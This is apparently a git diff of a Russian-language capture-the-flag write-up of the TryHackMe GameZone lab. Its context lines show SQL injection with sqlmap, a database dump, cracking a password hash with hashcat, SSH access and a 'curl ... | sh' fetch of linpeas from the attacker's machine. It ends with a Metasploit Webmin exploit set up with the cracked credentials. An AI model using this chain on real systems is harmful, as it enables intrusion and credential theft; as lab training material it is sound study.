@@ -23,7 +23,7 @@ export ip=10.10.220.157 && nmap_ctf $ip
 ```
 
 ### nmap:
-```
+```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -51,7 +51,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 ### sqlmap
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/scans]
 └─$ sqlmap -u http://10.10.220.157/index.php --method POST --data "username=*&password=pass&x=14&y=12" --dbms=mysql --technique=BT  --random-agent --flush-session --dbs
 sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
@@ -78,7 +78,7 @@ login [' OR true -- -]
 pass  [' OR true -- -]
 
 Далее дамп при помощи sqlmap
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
 └─$ sqlmap -r post.txt --dbms=mysql -D db -T users --dump 
 ---
@@ -97,14 +97,14 @@ Table: users
 ## 📂 Получение доступа
 
 Сохраняю hash
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
 └─$ cat hash.txt           
 ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
 ```
 
 Запускаю hashcat
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
 └─$ hashcat -m 1400 -a 0  hash.txt /media/sf_Exchange/Dictionaries/rockyou.txt
 
@@ -114,7 +114,7 @@ ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124
 ```
 
 Получаю ssh
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
 └─$ ssh agent47@10.10.220.157             
 The authenticity of host '10.10.220.157 (10.10.220.157)' can't be established.
@@ -146,7 +146,7 @@ agent47@gamezone:~$ cat user.txt
 ## ⚙️ Привилегии
 
 Вывожу информацию о текущих сетевых соединениях, сокетах и открытых портах
-```
+```bash
 agent47@gamezone:~$ ss -tulpn
 Netid  State      Recv-Q Send-Q         Local Address:Port                        Peer Address:Port              
 udp    UNCONN     0      0                          *:10000                                  *:*                  
@@ -159,7 +159,7 @@ tcp    LISTEN     0      128                       :::22                        
 ```
 
 Скачиваю на атакующую машину LinPEAS.sh, запускаю сервер
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250701-bdcab634/linpeas.sh
 
@@ -173,7 +173,7 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 ```
 
 Проверяю наличие curl и sh на жертве и запускаю linpeas.sh
-```
+```bash
 agent47@gamezone:~$ which curl
 /usr/bin/curl
 agent47@gamezone:~$ which sh
@@ -185,7 +185,7 @@ agent47@gamezone:~$ curl 10.21.104.16:8888/linpeas.sh | sh
 ![linpeas](screenshots/01.linpeas.png)
 
 В целом, есть много других векторов, помимо предложенных в задании, например:
-```
+```bash
                       ╔════════════════════════════════════╗
 ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                 
                       ╚════════════════════════════════════╝                                                       
@@ -210,7 +210,7 @@ ICMP is not accessible
 ```
 
 Настраиваю SSH-туннель с пробросом порта
-```
+```bash
 ssh -L 10000:localhost:10000 agent47@$ip
 ```
  - ssh — запускает SSH-клиент.
@@ -220,7 +220,7 @@ ssh -L 10000:localhost:10000 agent47@$ip
 ![webmin](screenshots/02.webmin.png)
 
 metasploit
-```
+```bash
 msf6 > search webmin
 
 Matching Modules
@@ -249,7 +249,7 @@ After interacting with a module you can manually set a TARGET with set TARGET 'A
 msf6 > use 0
 ```
 
-```
+```bash
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set RHOST localhost
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
